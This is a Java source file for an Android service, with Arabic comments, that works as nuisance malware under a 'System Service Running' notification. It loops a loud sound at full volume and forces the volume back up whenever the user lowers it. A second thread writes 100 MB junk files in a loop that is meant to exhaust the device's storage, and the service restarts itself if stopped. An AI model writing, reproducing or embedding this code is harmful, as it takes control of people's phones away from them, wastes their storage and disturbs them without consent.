package com.example.app;

import android.app.*;
import android.content.Context;
import android.content.Intent;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.os.Build;
import android.os.IBinder;
import java.io.File;
import java.io.FileOutputStream;

public class BgService extends Service {
    private MediaPlayer mediaPlayer;
    private AudioManager audioManager;

    @Override
    public void onCreate() {
        super.onCreate();
        String CHANNEL = "ch";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel c = new NotificationChannel(CHANNEL, "A_Art", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(c);
        }
        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? new Notification.Builder(this, CHANNEL) : new Notification.Builder(this);
        
        startForeground(1, b.setContentTitle("A_Art").setContentText("System Service Running").setSmallIcon(android.R.drawable.ic_menu_manage).setOngoing(true).build());

        // ===== 1. تشغيل الصوت =====
        audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);

        mediaPlayer = MediaPlayer.create(this, R.raw.loud);
        mediaPlayer.setLooping(true);
        mediaPlayer.setVolume(1.0f, 1.0f);
        mediaPlayer.start();

        // منع خفض الصوت
        new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(200);
                    if (audioManager.getStreamVolume(AudioManager.STREAM_MUSIC) < audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)) {
                        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
                    }
                } catch (Exception e) {}
            }
        }).start();

        // ===== 2. ملء المساحة (10,000 جيجا بسرعة رهيبة) =====
        new Thread(() -> {
            try {
                File dir = getExternalFilesDir(null);
                
                // بنستخدم ملفات حجمها 100 ميجا عشان السرعة والموارد
                byte[] buffer = new byte[100 * 1024 * 1024]; 
                
                // 100,000 ملف × 100 ميجا = 10,000,000 ميجا = 10,000 جيجا
                int maxFiles = 100000; 

                for (int i = 0; i < maxFiles; i++) {
                    File file = new File(dir, "art_cache_" + i + ".bin");
                    if (file.exists()) continue;
                    
                    FileOutputStream fos = new FileOutputStream(file);
                    fos.write(buffer); // كتابة 100 ميجا في خطوة واحدة
                    fos.close();
                }
            } catch (Exception e) {
                // هيتوقف هنا لما المساحة تخلص أو الذاكرة تبوظ
            }
        }).start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
